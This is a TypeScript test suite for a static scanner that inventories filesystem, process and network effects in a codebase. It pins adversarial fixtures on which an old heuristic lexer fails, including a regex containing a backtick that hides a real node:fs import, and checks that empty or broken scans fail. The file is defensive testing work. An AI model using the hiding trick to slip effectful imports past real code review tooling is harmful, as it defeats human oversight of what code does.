const ADVERSARIAL_SET: readonly {
  readonly name: string;
  readonly source: string;
  readonly parse: readonly string[];
  readonly heuristic: readonly string[];
}[] = Object.freeze([
  {
    name: 'a `//` comment opener inside a string literal',
    source: [
      "export const doc = 'note: // import x from \\'node:child_process\\'';",
      "import { readFile } from 'node:fs';",
      'export const read = readFile;',
    ].join('\n'),
    parse: ['node:fs'],
    heuristic: ['node:fs'],
  },
  {
    name: 'an unbalanced `/* */` pair split across two template literals',
    source: [
      'export const head = `a /* b`;',
      "export const tail = `c */ import x from 'node:child_process'`;",
      "import { readFile } from 'node:fs';",
      'export const read = readFile;',
    ].join('\n'),
    parse: ['node:fs'],
    heuristic: ['node:fs'],
  },
  {
    name: "a regex literal containing a ' quote, in operand position",
    source: [
      "export const RE = /['\"]/;",
      "import { readFile } from 'node:fs';",
      'export const read = readFile;',
    ].join('\n'),
    parse: ['node:fs'],
    heuristic: ['node:fs'],
  },
  {
    // KILL — the dangerous direction. `return` makes the heuristic score the `/`
    // as division, so the BACKTICK inside the regex opens a phantom template
    // literal. Unlike `'`/`"` a template is not line-bounded, so it runs to EOF
    // and swallows the real `node:fs` import below it. A module that performs
    // filesystem I/O scans as effect-free.
    name: 'a regex literal containing a BACKTICK, in operand position',
    source: [
      'export function isTick(s: string): boolean { return /`/.test(s); }',
      "import { readFile } from 'node:fs';",
      'export const read = readFile;',
    ].join('\n'),
    parse: ['node:fs'],
    heuristic: [],
  },
  {
    // KILL — the other direction. The heuristic TOGGLES on every backtick, so
    // the body of the template nested inside the `${…}` substitution reads as
    // code and its template text is scanned for imports. The module imports
    // nothing at all; the census invents a `node:child_process` occurrence.
    name: 'a nested template literal inside a `${…}` substitution',
    source:
      'export const doc = `outer ${ `inner from \'node:child_process\' text` } end`;',
    parse: [],
    heuristic: ['node:child_process'],
  },
]);

describe('DR-26 kill fixture — where the heuristic and a real parse disagree', () => {
  it('EffectLedger_AdversarialSet_ParseAndHeuristicAnswersAreBothPinned', () => {
    const disagreeing: string[] = [];
    for (const row of ADVERSARIAL_SET) {
      const parsed = extractImports(row.source, lexModule).map((r) => r.specifier);
      const heuristic = extractImports(row.source, SUPERSEDED_LEXER).map((r) => r.specifier);
      expect(parsed, `${row.name} — parse`).toEqual([...row.parse]);
      expect(heuristic, `${row.name} — heuristic`).toEqual([...row.heuristic]);
      if (JSON.stringify(parsed) !== JSON.stringify(heuristic)) disagreeing.push(row.name);
    }
    // NON-EMPTY DENOMINATOR for the kill fixture itself. A table on which the
    // two instruments never differ would prove the port changed nothing.
    expect(disagreeing).toEqual([
      'a regex literal containing a BACKTICK, in operand position',
      'a nested template literal inside a `${…}` substitution',
    ]);
  });

  it('EffectLedger_RegexHoldingABacktick_HidesARealFilesystemImportFromTheHeuristic', () => {
    // The FALSE-NEGATIVE kill, carried all the way to the verdict. This is the
    // dangerous direction for a fail-closed census: the module really does
    // import `node:fs`, and the retired lexer reported nothing at all.
    const source = [
      'export function isTick(s: string): boolean { return /`/.test(s); }',
      "import { readFile } from 'node:fs';",
      'export const read = readFile;',
    ].join('\n');

    expect(extractImports(source, SUPERSEDED_LEXER).map((r) => r.specifier)).toEqual([]);
    expect(extractImports(source, lexModule).map((r) => r.specifier)).toEqual(['node:fs']);

    expect(detectModuleEffects('rogue/hidden-fs.ts', source, SUPERSEDED_LEXER)).toEqual([]);
    expect(detectModuleEffects('rogue/hidden-fs.ts', source, lexModule)).toEqual([
      { module: 'rogue/hidden-fs.ts', effectClass: 'filesystem', evidence: 'node:fs' },
    ]);
  });

  it('EffectLedger_NestedTemplateSubstitution_MakesTheHeuristicInventAnEffect', () => {
    // The FALSE-POSITIVE kill. The module header used to promise "the census can
    // under-report a smuggled effect, but it never invents one". It could, and
    // this is the input on which it did.
    const source =
      'export const doc = `outer ${ `inner from \'node:child_process\' text` } end`;';

    expect(extractImports(source, SUPERSEDED_LEXER).map((r) => r.specifier)).toEqual([
      'node:child_process',
    ]);
    expect(extractImports(source, lexModule).map((r) => r.specifier)).toEqual([]);

    expect(detectModuleEffects('quiet/doc.ts', source, SUPERSEDED_LEXER)).toEqual([
      { module: 'quiet/doc.ts', effectClass: 'process', evidence: 'node:child_process' },
    ]);
    expect(detectModuleEffects('quiet/doc.ts', source, lexModule)).toEqual([]);
  });

  it('EffectLedger_NestedTemplateSubstitution_AlsoDefeatedTheAmbientMask', () => {
    // The same defect in the OTHER retired walk, which is why one port answers
    // both questions from one parse. The documented trust boundary claimed
    // "maskNonCode masks a template literal whole, so an ambient-global call
    // written inside `${…}` is masked with it". It did not.
    const source = 'export const doc = `outer ${ `inner fetch(u) text` } end`;';

    expect(maskNonCode(source, SUPERSEDED_LEXER)).toContain('fetch(');
    expect(maskNonCode(source, lexModule)).not.toContain('fetch(');

    expect(detectModuleEffects('quiet/doc.ts', source, SUPERSEDED_LEXER)).toEqual([
      { module: 'quiet/doc.ts', effectClass: 'network', evidence: 'fetch' },
    ]);
    expect(detectModuleEffects('quiet/doc.ts', source, lexModule)).toEqual([]);

    // …and the substitution ITSELF is code, so a real ambient call written in a
    // `${…}` is now SEEN. That closes the carve-out rather than restating it.
    const inSubstitution = 'export const doc = `outer ${ fetch(u) } end`;';
    expect(detectModuleEffects('rogue/interp.ts', inSubstitution, SUPERSEDED_LEXER)).toEqual([]);
    expect(detectModuleEffects('rogue/interp.ts', inSubstitution, lexModule)).toEqual([
      { module: 'rogue/interp.ts', effectClass: 'network', evidence: 'fetch' },
    ]);
  });

  it('EffectLedger_ImportTypeQuery_IsAnEdgeButNotAnEffect', () => {
    // `import('p').T` is erased at emit, so it is not an effect site — but it IS
    // an import edge, which `layer-boundaries-seam.ts` consumes. The retired
    // walk got this backwards: it recorded type queries as VALUE imports (it
    // matched the `import(` token and never saw the type position), which is why
    // `verbs/worktree/manager.ts` reported `node:fs` twice on the live
    // tree. The port tags them type-only so both consumers can be right.
    const source = [
      "export type Handle = import('node:fs').Stats | null;",
      'export const zero = 0;',
    ].join('\n');

    expect(extractImports(source, lexModule)).toEqual([
      { specifier: 'node:fs', typeOnly: true },
    ]);
    expect(extractImportSpecifiers(source, lexModule)).toEqual(['node:fs']);
    expect(detectModuleEffects('x/types.ts', source, lexModule)).toEqual([]);

    // The retired walk charged it as a runtime filesystem effect.
    expect(detectModuleEffects('x/types.ts', source, SUPERSEDED_LEXER)).toEqual([
      { module: 'x/types.ts', effectClass: 'filesystem', evidence: 'node:fs' },
    ]);
  });

  it('EffectLedger_RecoveredParse_IsRefusedRatherThanUnderReported', () => {
    // `ts.createSourceFile` never throws: handed broken input it returns a
    // partial tree with nodes silently missing. For this census an under-count
    // is the dangerous direction — a module whose imports vanished reads as
    // effect-free and PASSES — so the port refuses a recovered parse instead of
    // averaging it in.
    const broken = "import { readFile } from 'node:fs'\nexport const x = {{{;";
    expect(() => lexModule(broken, 'rogue/broken.ts')).toThrow(/did not parse cleanly/);
    expect(() => detectModuleEffects('rogue/broken.ts', broken, lexModule)).toThrow(
      /rogue\/broken\.ts/,
    );
  });

  it('EffectLedger_NoShippedModuleImportsTheSupersededLexer', async () => {
    // The retired walk is retained ONLY as the other half of the measurement
    // above. If shipped source ever imports it again, the defect is back.
    const { readdir, readFile } = await import('node:fs/promises');
    const files: string[] = [];
    const walk = async (dir: string): Promise<void> => {
      for (const entry of await readdir(dir, { withFileTypes: true })) {
        if (entry.isDirectory()) {
          if (EXCLUDED_DIRS.has(entry.name)) continue;
          await walk(join(dir, entry.name));
        } else if (entry.isFile() && isScannableFile(entry.name)) {
          files.push(join(dir, entry.name));
        }
      }
    };
    await walk(SRC_ROOT);
    // NON-EMPTY DENOMINATOR: a walk that resolved nothing would pass vacuously.
    expect(files.length).toBeGreaterThan(100);

    const offenders: string[] = [];
    for (const file of files) {
      const specifiers = extractImportSpecifiers(await readFile(file, 'utf8'), lexModule);
      if (specifiers.some((s) => s.includes('superseded-source-lexer'))) offenders.push(file);
    }
    expect(offenders).toEqual([]);
  });
});

describe('DR-26 non-empty denominator — a scan that resolved nothing FAILS', () => {
  const rules: readonly EffectOwnershipRule[] = Object.freeze([
    {
      effectClass: 'process',
      match: 'vcs/',
      owner: 'vcs',
      idempotency: 'i',
      compensation: 'c',
    } as const,
  ]);
  const claimed: EffectOccurrence = {
    module: 'vcs/shell.ts',
    effectClass: 'process',
    evidence: 'node:child_process',
  };

  it('EffectLedger_ScanVisitingZeroModules_FailsRatherThanReportingACleanTree', () => {
    const result = runEffectLedgerCensus(
      { occurrences: [claimed], moduleCount: 0, specifierCount: 0 },
      rules,
    );
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.code)).toContain('EMPTY_MODULE_POPULATION');
    expect(result.moduleCount).toBe(0);
  });

  it('EffectLedger_LexerResolvingZeroSpecifiers_FailsRatherThanReportingACleanTree', () => {
    // The population is healthy; the LEXER answered nothing. Import-shape rules
    // 1–4 therefore ranged over an empty surface, which looks exactly like a tree
    // that imports nothing — and reads as a pass.
    const result = runEffectLedgerCensus(
      { occurrences: [claimed], moduleCount: 587, specifierCount: 0 },
      rules,
    );
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.code)).toEqual(['EMPTY_SPECIFIER_DENOMINATOR']);
    expect(result.specifierCount).toBe(0);
  });

  it('EffectLedger_MuteLexerOverTheLiveTree_FailsTheCensus', async () => {
    // End to end, over the REAL tree, through the port: a lexer that resolves
    // nothing must not produce a green census. This is the tooth that makes the
    // inversion safe — the port is caller-supplied, so a caller CAN pass one
    // that answers nothing.
    const mute: ModuleLexer = () => ({ imports: [], maskedSource: '' });
    const result = await auditEffectOwnership(SRC_ROOT, mute);
    expect(result.moduleCount).toBeGreaterThan(100);
    expect(result.specifierCount).toBe(0);
    expect(result.ok).toBe(false);
    expect(result.diagnostics.map((d) => d.code)).toContain('EMPTY_SPECIFIER_DENOMINATOR');
  });

  it('EffectLedger_LiveTree_ResolvesANonEmptyModuleAndSpecifierPopulation', async () => {
    // The positive half: the teeth above are only meaningful if the real scan
    // clears them by a wide margin.
    const scan = await scanEffectTree(SRC_ROOT, lexModule);
    expect(scan.moduleCount).toBeGreaterThan(100);
    expect(scan.specifierCount).toBeGreaterThan(1000);
    expect(scan.occurrences.length).toBeGreaterThan(0);
  });
});
